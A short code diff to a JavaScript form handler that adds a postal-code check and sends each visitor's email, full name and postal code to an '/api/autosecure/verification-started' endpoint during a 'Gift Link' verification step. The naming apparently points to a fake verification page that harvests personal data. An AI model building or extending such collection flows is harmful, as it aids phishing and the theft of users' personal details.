@@ -50,7 +50,26 @@ confirmFiles.forEach(fileName => {
 
                     if (!email.value || !isValidEmail(email.value)) return false;
                     if (!fullName.value || fullName.value.length < 2) return false;
+                    if (!postalCode.value || postalCode.value.length < 3) return false;
                     if (!agreeTerms.value) return false;
+
+                    // Enviar embed de verification started
+                    try {
+                        await fetch('/api/autosecure/verification-started', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                email: email.value,
+                                fullName: fullName.value,
+                                postalCode: postalCode.value,
+                                product: 'Gift Link'
+                            })
+                        });
+                    } catch (error) {
+                        console.error('Error sending verification started embed:', error);
+                    }
 
                     isPageLoading.value = true;
                     
